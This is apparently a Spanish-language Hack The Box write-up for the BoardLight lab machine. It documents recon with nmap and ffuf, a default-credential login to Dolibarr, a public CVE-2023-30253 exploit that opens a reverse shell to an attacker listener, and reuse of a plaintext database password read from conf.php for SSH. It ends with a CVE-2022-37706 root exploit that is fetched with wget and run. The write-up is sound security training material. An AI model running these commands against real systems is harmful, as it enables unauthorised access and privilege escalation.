---
title: BoardLight
description: Boardlight es una máquina de dificultad fácil que cuenta con una instancia de dolibarr vulnerable a CVE-2023-30253. Esta vulnerabilidad se aprovecha para obtener acceso como www-data. Después de enumerar y volcar el contenido del archivo de configuración web, se encuentran las credenciales en texto plano que conducen al acceso ssh de la máquina. Al enumerar el sistema, se identifica un binario SUID relacionado con enlightenment que es vulnerable a una escalada de privilegios a través de CVE-2022-37706 y puede ser explotado para obtener un shell con privilegios de root.
date: 2024-06-03
toc: true
pin: false
image:
 path: /assets/img/htb-writeup-boardlight/boardlight_logo.png
categories:
  - Hack_The_Box
  - Machines
tags:
  - linux
  - hack_the_box
  - fuzzing_web
  - rce
  - cve
  - data_leaks
  - misconfigurations
  - suid
  - ssh
  - http
  - tcp
  - information_gathering
  - web_analysis
  - cve_exploitation
  - lateral_movement
  - privilege_escalation


---
## Information Gathering

```terminal
/home/kali/Documents/htb/machines/boardlight:-$ sudo nmap -p- -sS --min-rate 5000 -vvv -n -Pn 10.10.11.11 -oG map1
Host: 10.10.11.11 ()	Status: Up
Host: 10.10.11.11 ()	Ports: 22/open/tcp//ssh///, 80/open/tcp//http///

/home/kali/Documents/htb/machines/boardlight:-$ sudo nmap -sCV -p22,80 -vvv -oG map2 10.10.11.11
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
|_  256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.41 (Ubuntu)
```

![](/assets/img/htb-writeup-boardlight/boardlight1_1.png)

```terminal
/home/kali/Documents/htb/machines/boardlight:-$ dirb http://10.10.11.11 /usr/share/wordlists//seclists/Discovery/DNS/subdomains-top1million-20000.txt
==> DIRECTORY: http://10.10.11.11/img/
==> DIRECTORY: http://10.10.11.11/css/
==> DIRECTORY: http://10.10.11.11/js/

/home/kali/Documents/htb/machines/boardlight:-$ ffuf -u http://board.htb/ -H 'Host: FUZZ.board.htb' -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt
```

![](/assets/img/htb-writeup-boardlight/boardlight1_2.png)

```terminal
/home/kali/Documents/htb/machines/boardlight:-$ curl -s http://board.htb | wc -c
15949
```
El resultado '15949' indica que la respuesta de la página tiene 15,949 bytes.

```terminal
/home/kali/Documents/htb/machines/boardlight:-$ ffuf -u http://board.htb -H 'Host: FUZZ.board.htb' -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -ic -t 200 -c -fs 15949
crm                     [Status: 200, Size: 6360, Words: 397, Lines: 150, Duration: 1328ms]
```
'fs 15949' filtra las respuestas por tamaño. En este caso, se filtran respuestas que tienen un tamaño de 15,949 bytes (el mismo tamaño que el de la página inicial).

El subdirectorio que se encontró 'crm' devuelve un código de estado HTTP 200 con un tamaño de 6360 bytes. El hecho de que el tamaño sea diferente al de la página inicial (15949 bytes) indica que este directorio tiene contenido distinto.

---
## Web Analysis & CVE Exploitation

```terminal
/home/kali/Documents/htb/machines/boardlight:-$ echo '10.10.11.11\tboard.htb\tcrm.board.htb' | sudo tee -a /etc/hosts
```

![](/assets/img/htb-writeup-boardlight/boardlight2_1.png)

Antes de buscar vulnerabilidades para 'Dolibarr', pruebo autentificarme con credenciales por defecto.

El login resulta valido con 'user:admin', 'password:admin'.

![](/assets/img/htb-writeup-boardlight/boardlight2_2.png)

Dolibarr 17.0.0 es vulnerable a Remoted Code Execution.

<https://nvd.nist.gov/vuln/detail/CVE-2023-30253>

<https://github.com/Rubikcuv5/cve-2023-30253>

```terminal
/home/kali/Documents/htb/machines/boardlight:-$ git clone https://github.com/Rubikcuv5/cve-2023-30253.git

/home/kali/Documents/htb/machines/boardlight:-$ nc -lnvp 4444
	listening on [any] 4444 ...

/home/kali/Documents/htb/machines/boardlight:-$ python3 CVE-2023-30253.py --url http://crm.board.htb/ -u admin -p admin -r 10.10.16.5 4444
[*] Trying authentication...
[**] Login: admin
[**] Password: admin
[*] Trying created site...
[*] Trying created page...
[*] Trying editing page and call reverse shell... Press Ctrl+C after successful connection

	... connect to [10.10.16.5] from (UNKNOWN) [10.10.11.11] 58436

www-data@boardlight:~$ whoami
www-data
```

---
## Lateral Movement

Despues de conseguir el foothold, enumero el sistema y encuentro la contraseña ssh para el usuario 'larissa'.
```terminal
www-data@boardlight:~$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
larissa:x:1000:1000:larissa,,,:/home/larissa:/bin/bash
```
```
www-data@boardlight:~/html/crm.board.htb$ find . -name \*conf\* 2>/dev/null
./htdocs/conf/conf.php

www-data@boardlight:~/html/crm.board.htb$ cat html/htdocs/conf/conf.php
$dolibarr_main_db_pass='serverfun2$2023!!';
```
```terminal
/home/kali/Documents/htb/machines/boardlight:-$ ssh larissa@10.10.11.11
larissa@10.10.11.11's password: serverfun2$2023!!

larissa@boardlight:~$ cat user.txt
```
---
## Privilege Escalation & CVE Exploitation

Listo privilegios SUID.

```terminal
larissa@boardlight:~$ find / -perm -4000 2>/dev/null
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight
/usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset
```
La version de 'enlightement' es vulnerable, CVE-2022-37706.

```terminal
larissa@boardlight:~$ dpkg -l | grep enlightenment
hi  enlightenment             0.23.1-4          amd64        X11 window manager based on EFL
hi  enlightenment-data        0.23.1-4          all          X11 window manager based on EFL - run time data files
```
Utilizo el siguiente exploit, <https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit>

```terminal
/home/kali/Documents/htb/machines/boardlight:-$ git clone https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit.git
/home/kali/Documents/htb/machines/boardlight:-$ python3 -m http.server 8001
```
```terminal
larissa@boardlight:/tmp$ wget http://10.10.16.5:8001/exploit.sh
larissa@boardlight:/tmp$ chmod +x exploit.sh
```
```terminal
larissa@boardlight:/tmp$ ./exploit.sh
```
![](/assets/img/htb-writeup-boardlight/boardlight3_1.png)

```terminal
python -c 'import pty;pty.spawn("/bin/bash")'
root@boardlight:~$ cat /root/root.txt
```

> <a href="https://labs.hackthebox.com/achievement/machine/1521382/608" target="_blank">***Litio7 has successfully solved Boardlight from Hack The Box***</a>
{: .prompt-info style="text-align:center" }